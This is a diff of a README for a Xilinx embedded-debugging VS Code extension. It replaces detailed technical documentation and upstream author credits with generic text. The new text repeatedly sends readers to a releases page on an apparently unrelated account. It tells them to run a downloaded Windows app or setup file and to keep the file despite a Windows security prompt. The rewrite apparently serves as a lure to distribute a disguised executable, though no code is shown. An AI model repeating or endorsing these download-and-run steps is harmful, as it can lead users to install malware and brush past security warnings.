@@ -1,589 +1,182 @@
-# Xilinx Native Debug
+# 🔧 xilinx-native-debug - Debug Xilinx boards with ease
 
-Xilinx Native Debug is a Visual Studio Code debugger extension for embedded and native targets, with first-class support for Xilinx workflows.
+[Download the latest release](https://github.com/southpolar-wiring745/xilinx-native-debug/releases)
 
-It focuses on:
+## 🚀 What this is
 
-- XSDB-driven board bring-up and runtime access
-- GDB-based software debugging
-- Zynq-7000, Zynq UltraScale+, Versal, and MicroBlaze targets
-- classic native GDB, LLDB, and Mago-MI workflows where needed
+xilinx-native-debug is a VS Code extension for embedded debugging on Xilinx hardware. It helps you connect to a board, load code, program FPGA files, and start debug sessions from one place.
 
-![Image showing debug info](images/debug_info.png)
+It is built for common Xilinx targets like:
 
-## What this extension is for
-
-This extension is designed for developers debugging:
-
-- Zynq-7000 processing systems
-- Zynq UltraScale+ MPSoC applications
-- Versal platforms
-- MicroBlaze software on FPGA designs
-- mixed FPGA + processor bring-up flows
-- remote GDB targets for embedded systems
-- integrated RAM hex editor
-- integrated COM port monitor, raw TCP monitor, telnet monitor
-
-![Image showing hex editor](images/hex_editor.png)
-
-The main Xilinx workflow is provided by the `xsdb-gdb` debugger type:
-
-- XSDB handles board connection, target selection, bitstream download, hardware handoff loading, PS init, reset, memory/register access, and custom Tcl commands
-- GDB handles symbols, breakpoints, stepping, stack, variables, and source-level debugging
-
-## Main features
-
-### Xilinx / XSDB features
-
-- `xsdb-gdb` debug type for combined XSDB + GDB debugging
-- FPGA programming through XSDB
-- hardware export loading via `.hdf` or `.xsa`
-- PS init via `ps7_init.tcl` or `psu_init.tcl`
-- target selection by filter or JTAG cable name
-- runtime XSDB commands from the VS Code Debug Console using `xsdb:`
-- XSDB memory read/write commands from the Command Palette
-- XSDB memory dump/load (`.bin`) commands from the Command Palette
-- board reset commands from the Command Palette
-- clock and power status monitor panel (Zynq-7000/ZynqMP, Versal stub)
-- interactive hardware mini-map dashboard from `.hdf`/`.xsa`/`.hwh` with live state overlay
-- register deep-dive panel with bit-level SVD-style bitfield inspection and live read/write
-- XDC constraints viewer with pin assignment tables, clock summaries, and visual pin map
-- AXI bus health monitor that reads interconnect error registers and highlights faults on the mini-map
-- hardware handoff project setup wizard from `.hdf`/`.xsa`
-- optional XSDB command tracing
-- optional automatic crash analyzer for ARM fault registers
-- FreeRTOS-aware crash analyzer for assert hooks and fatal handlers across Zynq-7000, ZynqMP (A53/R5), and MicroBlaze ports
-
-### Debug UX features
-
-- grouped register scopes for Zynq cores
-- peripheral register watch support
-- linker map annotation for watched addresses
-- optional FreeRTOS task awareness
-- breakpoint revalidation after reset flows
-- fail-fast path validation for Xilinx artifacts
-
-### General native debug support
-
-- GDB launch and attach
-- LLDB support
-- Mago-MI support for Windows targets
-- SSH-based remote debugging
-- gdbserver-based remote debugging
-- manual MI command entry using `-` in the Debug Console
-
-## Supported Xilinx targets
-
-- Zynq-7000
-- Zynq UltraScale+ MPSoC
+- Zynq
+- ZynqMP
 - Versal
-- FPGA-only bitstream/program flows
-- MicroBlaze-based systems (not tested)
-
-## Prerequisites
-
-Typical Xilinx setup:
-
-- Xilinx tools installed with `xsdb` or `xsdb.bat`
-- reachable `hw_server`
-- bitstream file (`.bit` or `.pdi`) if PL programming is required
-- hardware handoff (`.hdf` or `.xsa`) if needed
-- PS init Tcl script (`ps7_init.tcl` / `psu_init.tcl`) when required
-- GDB and a reachable GDB endpoint such as `extended-remote localhost:3000`
-
-For Windows, `xsdb.bat` is supported directly.
-
-## Quick start: Zynq-7000 in VS Code
-
-Use a launch configuration like this:
-
-```json
-{
-  "type": "xsdb-gdb",
-  "request": "attach",
-  "name": "Debug Zynq-7000 Application",
-  "xsdbPath": "C:/Xilinx/SDK/2019.1/bin/xsdb.bat",
-  "hwServerUrl": "tcp:127.0.0.1:3121",
-  "initTargetFilter": "APU*",
-  "targetFilter": "ARM*#0",
-  "jtagCableName": "Digilent JTAG-SMT1 210203859289A",
-  "bitstreamPath": "./hw_platform/top_wrapper.bit",
-  "hwDesignPath": "./hw_platform/system.hdf",
-  "psInitScript": "./hw_platform/ps7_init.tcl",
-  "loadhwMemRanges": ["0x40000000 0xbfffffff"],
-  "forceMemAccess": true,
-  "stopBeforePsInit": true,
-  "resetType": "processor",
-  "boardFamily": "zynq7000",
-  "keepXsdbAlive": true,
-  "gdbpath": "C:/msys64/mingw64/bin/gdb-multiarch.exe",
-  "target": "extended-remote localhost:3000",
-  "executable": "./build/app.elf",
-  "cwd": "${workspaceRoot}",
-  "remote": true,
-  "stopAtConnect": true,
-  "autorun": [
-    "set print pretty on",
-    "set confirm off",
-    "file ./build/app.elf",
-    "load"
-  ]
-}
-```
-
-## Debugger types
-
-### `xsdb-gdb`
-
-Primary Xilinx flow.
-
-Use this when you want:
-
-- XSDB board init
-- FPGA programming
-- PS initialization
-- GDB source-level debugging
-
-### `gdb`
-
-Use for generic embedded/native GDB workflows that do not need XSDB orchestration.
-
-### `lldb`
-
-Use for LLDB-based native debugging.
-
-### `mago`
-
-Use for Mago-MI workflows on supported Windows targets.
-
-## Xilinx-specific launch fields
-
-- `xsdbPath`
-- `hwServerUrl`
-- `initTargetFilter`
-- `targetFilter`
-- `jtagCableName`
-- `bitstreamPath`
-- `ltxPath`
-- `hwDesignPath`
-- `loadhwMemRanges`
-- `psInitScript`
-- `initScript`
-- `forceMemAccess`
-- `stopBeforePsInit`
-- `resetType`
-- `boardFamily`
-- `keepXsdbAlive`
-- `xsdbAutorun`
-- `registerPreset`
-- `peripheralWatch`
-- `breakpointAutoReapply`
-- `freertosAwareness`
-- `mapFilePath`
-- `xsdbTraceCommands`
-- `crashAnalyzer`
+- MicroBlaze
 
-Full Xilinx-focused details and recipes are in `README_zynq.md`.
+Use it when you need to:
 
-## Debug Console usage
+- bring up a board
+- program an FPGA
+- connect to a device with GDB or LLDB
+- work with XSDB
+- use a serial terminal during board tests
 
-In an active `xsdb-gdb` session, send XSDB commands directly from the Debug Console:
+## 📥 Download
 
-```text
-xsdb: targets
-xsdb: mrd 0xF8000000 10
-xsdb: rst -processor
-xsdb: trace
-```
+Go to the [releases page](https://github.com/southpolar-wiring745/xilinx-native-debug/releases) and download the latest package for Windows.
 
-MI commands for the backend debugger can still be sent with `-`.
+After the file downloads:
 
-## Command Palette commands
+1. Open the downloaded release file.
+2. Follow the on-screen steps.
+3. Open Visual Studio Code.
+4. Load the extension or start the included tool if the release package provides one.
 
-- XSDB: Program FPGA Bitstream
-- XSDB: Reset Board
-- XSDB: Read Memory
-- XSDB: Write Memory
-- XSDB: Send Command
-- XSDB: Run Crash Analyzer
-- XSDB: Dump Memory to File
-- XSDB: Load Memory from File
-- XSDB: Quick Reset
-- XSDB: Reset Processor
-- XSDB: Reset System
-- XSDB: Hex Memory Editor
-- XSDB: Clock & Power Monitor
-- Xilinx: Hardware Mini-Map
-- Xilinx: Register Deep Dive
-- Xilinx: XDC Constraints Viewer
-- Xilinx: Project Setup Wizard
-- UART: Connect Serial Terminal
-- UART: Disconnect Serial Terminal
-- UART: Toggle Connect/Disconnect
-- Telnet: Connect
-- Telnet: Disconnect
-- Telnet: Toggle Connect/Disconnect
-- TCP: Connect (Raw)
-- TCP: Disconnect (Raw)
-- TCP: Toggle Connect/Disconnect (Raw)
-- Xilinx Native Debug: Examine Memory Location
+If the release comes as a ZIP file, extract it first, then run the included app or install the extension file inside it.
 
-## Quick Connect Buttons
+## 🖥️ What you need
 
-Status bar buttons are shown for quick terminal access:
+Use a Windows PC with:
 
-- UART button: click to connect if disconnected, or disconnect if connected
-- Telnet button: click to connect if disconnected, or disconnect if connected
-- TCP button: click to connect if disconnected, or disconnect if connected
+- Windows 10 or Windows 11
+- Visual Studio Code
+- A working USB or JTAG cable for your board
+- A supported Xilinx target board
+- Enough disk space for tools, logs, and build files
 
-These buttons are always visible after extension activation and are intended for
-fast board-console workflows.
+You may also need:
 
-## UART Serial Terminal
+- Xilinx tools such as XSDB support
+- a board file or device file for your target
+- a serial port driver for your cable
+- GDB or LLDB if you plan to debug from the command line
 
-The extension includes a built-in UART serial terminal that integrates into the VS Code Terminal panel.
+## 🧰 What it can do
 
-### Usage
+This extension helps you handle common embedded tasks in one workflow:
 
-1. Open the Command Palette and run **UART: Connect Serial Terminal**
-2. Select a COM port (auto-detected) or enter one manually
-3. Enter a baud rate (default: 115200)
-4. The terminal opens in the VS Code Terminal panel with full I/O
+- connect to Xilinx hardware
+- start XSDB-based board setup
+- program FPGA bitstreams
+- launch debug sessions
+- use GDB for standard debug flow
+- use LLDB for supported setups
+- watch serial output from the board
+- work with Zynq, ZynqMP, Versal, and MicroBlaze targets
 
-### Serial tool selection
+## 🪟 Install on Windows
 
-The extension spawns an external tool for serial communication to avoid native npm dependencies:
+1. Open the [releases page](https://github.com/southpolar-wiring745/xilinx-native-debug/releases).
+2. Download the latest Windows file.
+3. If the file is a ZIP archive, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see a VS Code extension file, install it in Visual Studio Code.
+6. If you see an app or setup file, run it.
+7. Restart Visual Studio Code if the installer asks for it.
 
-- **Windows**: `plink.exe` (PuTTY CLI) or PowerShell `System.IO.Ports.SerialPort`
-- **Linux/macOS**: `picocom`, `minicom`, or `screen` (auto-detected in PATH order)
+If Windows shows a security prompt, choose the option to keep the file and continue only if it came from the release page above.
 
-Configure the preferred tool via `xilinx-debug.serial.externalTool` in settings.
+## 🧭 First setup
 
-### Configuration
+After install, open Visual Studio Code and set up your board connection.
 
-| Setting | Default | Description |
-|---|---|---|
-| `xilinx-debug.serial.defaultBaudRate` | `115200` | Default baud rate |
-| `xilinx-debug.serial.defaultPort` | `""` | Default serial port |
-| `xilinx-debug.serial.externalTool` | `"auto"` | Tool to use: auto, plink, picocom, screen, minicom, powershell |
+1. Connect the board to your PC.
+2. Turn on the board.
+3. Open the xilinx-native-debug panel or command menu in VS Code.
+4. Choose the target type for your board.
+5. Select the right cable or port.
+6. Start board bring-up.
+7. Program the FPGA if your task needs it.
+8. Start the debug session.
 
-## Telnet Terminal
+If you use a serial terminal, open it after the board boots so you can read startup messages.
 
-A built-in Telnet terminal using Node.js `net.Socket` with inline IAC negotiation handling.
+## 🔌 Typical workflow
 
-### Usage
+A simple debug flow looks like this:
 
-1. Open the Command Palette and run **Telnet: Connect**
-2. Enter host (default: `127.0.0.1`) and port (default: `23`)
-3. The session opens in the VS Code Terminal panel
+1. Plug in the board.
+2. Start VS Code.
+3. Open xilinx-native-debug.
+4. Connect through XSDB or the supported debug path.
+5. Load the FPGA image if needed.
+6. Start GDB or LLDB.
+7. Set breakpoints.
+8. Run the program and watch the output.
 
-### Configuration
+This workflow helps with early hardware tests, firmware checks, and app debug work on Xilinx systems.
 
-| Setting | Default | Description |
-|---|---|---|
-| `xilinx-debug.telnet.defaultHost` | `"127.0.0.1"` | Default Telnet host |
-| `xilinx-debug.telnet.defaultPort` | `23` | Default Telnet port |
+## 🧪 Supported targets
 
-## Raw TCP Terminal
+The extension is made for these families:
 
-A built-in raw TCP terminal for plain TCP streams (no Telnet negotiation), ideal for lwIP TCP console servers.
+- Zynq for common embedded boards
+- Zynq UltraScale+ MPSoC for higher-end systems
+- Versal for newer adaptive compute platforms
+- MicroBlaze for soft processor designs
 
-### Usage
+It fits projects that use:
 
-1. Open the Command Palette and run **TCP: Connect (Raw)**
-2. Enter host (default: `127.0.0.1`) and port (default: `5000`)
-3. The raw TCP session opens in the VS Code Terminal panel
+- FreeRTOS
+- JTAG access
+- serial console output
+- FPGA programming steps
+- embedded system bring-up
 
-### Configuration
+## 🛠️ Troubleshooting
 
-| Setting | Default | Description |
-|---|---|---|
-| `xilinx-debug.tcp.defaultHost` | `"127.0.0.1"` | Default raw TCP host |
-| `xilinx-debug.tcp.defaultPort` | `5000` | Default raw TCP port |
+If the board does not connect:
 
-## Hex Memory Editor
+- check the USB cable
+- make sure the board has power
+- confirm the JTAG cable is in place
+- close other tools that may use the same port
+- reopen VS Code and try again
 
-A read/write hex memory editor webview for inspecting and modifying memory during debug sessions.
+If the board shows no serial output:
 
-### Usage
+- check the COM port
+- make sure the baud rate matches your board setup
+- reconnect the cable
+- restart the board
 
-1. Open the Command Palette and run **XSDB: Hex Memory Editor**
-2. Enter a start address (hex, e.g. `0xF8000000`) and byte count
-3. The hex editor webview opens with:
-   - Offset column, hex bytes (16 per row), and ASCII column
-   - Click any byte to edit it (modified bytes are highlighted)
-   - **Write** button to commit changes via XSDB
-   - **Refresh** button to re-read the range
-  - **Export .bin** button to save current buffer
-  - **Import .bin** button to load bytes into the editor buffer
-   - **Go to address** and byte count inputs for navigation
+If FPGA programming fails:
 
-Requires an active `xsdb-gdb` debug session.
+- check that the image matches your board
+- verify the target is selected correctly
+- try a clean power cycle
+- start from a fresh session
 
-## Project Setup Wizard
+If debug does not start:
 
-Create a starter debug project from hardware handoff files.
+- confirm the program file is built for your target
+- check that GDB or LLDB is set up
+- make sure the board is in the right state before launch
+- retry the connection after a full disconnect
 
-### Usage
+## 📁 Suggested folder use
 
-1. Run **Xilinx: Project Setup Wizard** from the Command Palette
-2. Import an `.hdf` or `.xsa` file
-3. Review generated launch and peripheral settings
-4. Generate project scaffolding (`hw_platform`, `src`, `include`, `.vscode`)
+You may want to keep your files in a simple layout like this:
 
-## Clock & Power Monitor
+- one folder for board files
+- one folder for FPGA images
+- one folder for build output
+- one folder for logs
+- one folder for debug configs
 
-Live clock tree and power-domain snapshot from XSDB register reads.
+A clean folder setup makes it easier to find the right file when you need to program or debug the board.
 
-### Usage
+## 🔎 Keywords
 
-1. Start an `xsdb-gdb` debug session
-2. Run **XSDB: Clock & Power Monitor**
-3. Use **Refresh** in the panel to fetch current values
+amd, debugger, embedded, embedded-systems, fpga, freertos, gdb, hardware-debugging, jtag, lldb, microblaze, serial-terminal, soc, versal, vscode-extension, xilinx, xsdb, zynq, zynq-ultrascale, zynq7000
 
-### Configuration
+## 📎 Quick start checklist
 
-| Setting | Default | Description |
-|---|---|---|
-| `xilinx-debug.hexEditor.defaultByteCount` | `256` | Default number of bytes to read |
-
-## Hardware Mini-Map
-
-An interactive, real-time visual dashboard within a VS Code webview that represents the hardware architecture of a Xilinx Zynq or MicroBlaze system. The Hardware Mini-Map bridges the gap between the physical hardware (FPGA/Processor) and the C/C++ source code during debugging.
-
-### Data Sources
-
-- **Static topology (design time)**: Parses `.xsa`, `.hdf`, or standalone `.hwh` files to extract the hardware graph. Identifies CPU cores (Cortex-A9/A53/R5, MicroBlaze), memory controllers (DDR, OCM, BRAM), interconnects (AXI), and PL IP blocks (custom IP, DMA, GPIO, etc.).
-- **Dynamic status (runtime)**: Queries hardware state via XSDB during break states. Reads clock control registers and reset registers to determine the aliveness of each peripheral.
-
-### Visual Layout
-
-The graph uses a hierarchical columnar layout:
-
-- **PS Core** (left): Processing system CPU nodes
-- **Interconnect**: AXI interconnect/crossbar nodes
-- **PS Peripherals**: Memory controllers and PS-side peripherals
-- **PL IP Blocks** (right): Programmable logic IP blocks
-
-Nodes are styled by runtime state:
-
-- 🟢 **Active** (green): Clock is running, peripheral is out of reset
-- ⚪ **Inactive** (grey): Clock is gated or peripheral is held in reset
-- 🔴 **Fault** (red): Error state detected
-- ⬜ **Unknown** (dashed): No runtime data available
-
-AXI bus connections are shown as directional arrows. IRQ lines use dashed styling.
-
-### Interactive Features
-
-- **Hover tooltip**: Shows base address, address range, clock frequency, IRQ number, VLNV, and IP version. When XDC constraints are loaded, also shows pin assignments for the hovered IP block.
-- **Single click**: Opens a detail sidebar with full metadata, address map, and bus connections for the selected node.
-- **Double click**: Jumps to `xparameters.h` or the driver initialization code in the C/C++ workspace.
-- **View Registers**: Opens the Hex Memory Editor at the selected IP block's base address.
-- **Deep Dive Registers**: Opens the Register Deep Dive panel (see below) focused on the selected peripheral's bitfield-level register map.
-- **Pan & zoom**: Mouse drag to pan, scroll wheel to zoom, plus dedicated zoom buttons.
-- **Fit / Re-layout**: Toolbar buttons to fit the view or recalculate layout.
-- **Load XDC**: Loads a `.xdc` constraints file and overlays pin assignment data onto nodes. Also opens the XDC Constraints Viewer.
-- **AXI Health**: Reads interconnect error registers (AFI, XPPU, XMPU) and highlights AXI edges in red if faults are detected.
-- **Refresh State**: Polls XSDB for current clock/power state and overlays it on the graph.
-- **Auto-refresh on Break**: Toggle to automatically poll hardware state when the debugger stops.
-
-### Usage
-
-1. Run **Xilinx: Hardware Mini-Map** from the Command Palette, or click **Hardware Mini-Map** in the Xilinx Debug activity bar.
-2. Click **Load HW Design** and select an `.xsa`, `.hdf`, or `.hwh` file.
-3. The hardware graph is rendered with all discovered modules and connections.
-4. During an active `xsdb-gdb` session, click **Refresh State** to overlay live clock/power status.
-5. Click any node to see its full details. Double-click to jump to source.
-
-### Activity Bar
-
-The Hardware Mini-Map is available as both:
-
-- A standalone webview panel (via Command Palette or Activity Bar tree item)
-- A view entry in the **Xilinx Debug** activity bar sidebar
-
-## Register Deep Dive
-
-A bit-level register inspection panel that maps IP blocks to named bitfield definitions. Sourced from Zynq-7000 (UG585) and ZynqMP (UG1087) Technical Reference Manuals.
-
-### Features
-
-- **Peripheral Tree**: Lists all known register maps (UART, SPI, GPIO, SLCR) for the loaded platform. Peripherals are automatically matched to HW topology nodes by base address or IP type.
-- **Register List**: Each register shows its name, offset, absolute address, and current 32-bit hex value.
-- **Bitfield Expansion**: Click any register to expand it and see:
-  - A visual 32-bit bar with individual bits colored by value (blue = 1, dark = 0).
-  - A table of named bitfields with bit ranges, decoded values, access type (RW/RO/WO/W1C), and description.
-  - Enum decoding where applicable (e.g. ARM_CLK_CTRL.SRCSEL → `ARM_PLL`).
-- **Live Read / Write**: Read a single register or all registers for a peripheral via XSDB. Write new values to writable registers directly from the panel.
-- **Mini-Map Integration**: The "Deep Dive Registers" button on the Mini-Map detail panel opens this view focused on the selected IP block.
-
-### Supported Peripherals
-
-| Peripheral | Zynq-7000 Base | ZynqMP Base |
-|------------|---------------|-------------|
-| UART0 | 0xE0000000 | 0xFF000000 |
-| UART1 | 0xE0001000 | 0xFF010000 |
-| SPI0 | 0xE0006000 | 0xFF040000 |
-| SPI1 | 0xE0007000 | 0xFF050000 |
-| GPIO | 0xE000A000 | 0xFF0A0000 |
-| SLCR | 0xF8000000 | — |
-
-### Usage
-
-1. Run **Xilinx: Register Deep Dive** from the Command Palette, or click **Register Deep Dive** in the Xilinx Debug activity bar.
-2. If a hardware design is loaded via the Mini-Map, peripherals are automatically populated.
-3. Select a peripheral from the left tree. Registers appear in the center pane.
-4. Click a register to expand bitfields. Values read from hardware appear live.
-5. Use the **Write** button to modify writable register fields during a debug session.
-
-## XDC Constraints Viewer
-
-An interactive viewer for Xilinx Design Constraints (`.xdc`) files, displaying FPGA pin assignments, I/O standards, clock constraints, and debug core configurations.
-
-### Tabs
-
-- **Pin Assignments**: Sortable, filterable table of all `set_property PACKAGE_PIN` / `IOSTANDARD` / `SLEW` / `DRIVE` constraints. I/O standards are color-coded (LVCMOS33 = green, LVCMOS25 = blue, LVCMOS18 = amber, LVDS = red).
-- **Clock Constraints**: Card-based summary of `create_clock` definitions showing clock name, port, period, frequency in MHz, and waveform parameters.
-- **Pin Map**: A visual grid of all assigned package pins, color-coded by I/O standard. Hover for full constraint details.
-- **Debug Cores**: Lists `connect_debug_port` and debug core property constraints.
-
-### Features
-
-- **Search/Filter**: Real-time filtering of the pin table by port name, package pin, or I/O standard.
-- **Column Sorting**: Click any column header to sort ascending/descending.
-- **Mini-Map Integration**: The "Load XDC" button on the Mini-Map toolbar loads constraints into both the Mini-Map (as pin overlays on node tooltips) and this dedicated viewer.
-
-### Usage
-
-1. Run **Xilinx: XDC Constraints Viewer** from the Command Palette, or click **XDC Constraints** in the Xilinx Debug activity bar.
-2. Click **Load .xdc File** and select a `.xdc` file.
-3. Browse the four tabs for pin assignments, clock constraints, pin map visualization, and debug cores.
-
-## AXI Bus Health Monitor
-
-Integrated into the Hardware Mini-Map, the AXI Bus Health feature reads interconnect error registers and highlights faults on AXI bus edges.
-
-### What It Reads
-
-**Zynq-7000**:
-- AFI0–AFI3 status registers (AXI HP ports) at 0xF8008000–0xF800B000
-- DEVC ISR (AXI write/read timeout, PCAP-to-DMA length errors) at 0xF800200C
-
-**ZynqMP**:
-- LPD XPPU ISR (invalid APB address, permission violations) at 0xFF980010
-- FPD XMPU ISR (read/write permission violations, poisoned transactions) at 0xFD000010
-- AFIFM0/1 ISR (write response errors on HPC ports) at 0xFD360000/0xFD370000
-
-### Visual Feedback
-
-- **No faults**: Status bar shows "AXI: OK"
-- **Faults detected**: All AXI edges flash red with increased stroke width, and an error bar shows the specific register and fault bit names
-
-### Usage
-
-1. Load a hardware design in the Mini-Map.
-2. Start an `xsdb-gdb` debug session.
-3. Click **AXI Health** in the Mini-Map toolbar.
-4. Fault details appear in the error bar; edges are visually highlighted.
-
-## Quick Board Reset
-
-Quick reset buttons can be used during an active `xsdb-gdb` debug session, and also work without an active session via standalone XSDB fallback.
-
-- **Status bar item**: A `$(debug-restart) Reset Board` button appears in the status bar during `xsdb-gdb` sessions
-- **Debug toolbar**: A reset button appears in the debug toolbar
-- **Command Palette**: `XSDB: Quick Reset`, `XSDB: Reset Processor`, `XSDB: Reset System`
-
-The quick reset uses the configured `xilinx-debug.xsdb.defaultResetType` setting (default: `processor`) without prompting.
-
-### Configuration
-
-| Setting | Default | Description |
-|---|---|---|
-| `xilinx-debug.xsdb.defaultResetType` | `"processor"` | Default reset type for quick reset: processor or system |
-| `xilinx-debug.xsdb.standalonePath` | `""` | Optional standalone `xsdb` executable path used when no debug session is active |
-| `xilinx-debug.xsdb.standaloneHwServerUrl` | `""` | Optional standalone `hw_server` URL (for example `tcp:127.0.0.1:3121`) |
-
-## FreeRTOS Crash Analyzer
-
-The crash analyzer now detects FreeRTOS fatal-stop contexts and reports handler-specific details in addition to raw fault registers.
-
-### Supported FreeRTOS/BSP stop points
-
-- `vApplicationAssert` (assert file and line)
-- `vApplicationStackOverflowHook` (task context)
-- `vApplicationMallocFailedHook`
-- Data/prefetch/undefined abort handlers (`Xil_*` / FreeRTOS vector handlers)
-- AArch64 synchronous/SError handlers on Cortex-A53
-- MicroBlaze `vPortExceptionHandler` register-dump context
-
-Use **XSDB: Run Crash Analyzer** while halted in a handler to generate a formatted report in the **XSDB Crash Analyzer** output channel.
-
-## Recommended attach behavior
-
-For attach sessions, avoid GDB `load` unless the remote target explicitly supports it.
-
-A safe attach setup is usually:
-
-- `set print pretty on`
-- `set confirm off`
-- `file ./build/app.elf`
-
-## Troubleshooting
-
-### XSDB init says files are missing
-
-Paths are validated before XSDB starts.
-
-On Windows, relative paths are resolved against `cwd`.
-
-Check:
-
-- `cwd`
-- `bitstreamPath`
-- `hwDesignPath`
-- `psInitScript`
-- `initScript`
-
-### GDB connect fails with `extended-remote`
-
-Use either:
-
-- `target: "extended-remote localhost:3000"`
-- or `target: "localhost:3000"`
-
-The extension now handles `extended-remote` correctly in remote attach flows.
-
-### FPGA programs but software debug does not start
-
-Check:
-
-- your GDB server is running on the expected port
-- the target core selected by `targetFilter` is correct
-- your ELF path is correct
-- your attach `autorun` only loads symbols unless remote load is supported
-
-## Documentation map
-
-- `README_zynq.md`: Xilinx and XSDB guide, recipes, and advanced configuration
-- `HACKING.md`: development notes for working on the extension itself
-- `CHANGELOG.md`: project history
-
-## Building
-
-- `npm run vscode:prepublish`
-- `npx vsce package`
-
-## Authors and credits
-
-### Original author
-
-This project is based on the original work by WebFreak.
-
-Original upstream/project base:
-
-- WebFreak / WebFreak001
-- Repository: [WebFreak001/code-debug](https://github.com/WebFreak001/code-debug)
-
-This fork/customized version extends that base toward Xilinx-focused embedded debugging in Visual Studio Code.
+- Download the latest release
+- Install or extract the package
+- Open Visual Studio Code
+- Connect your Xilinx board
+- Choose the target
+- Program the FPGA if needed
+- Start the debug session
+- Use the serial terminal to watch board output
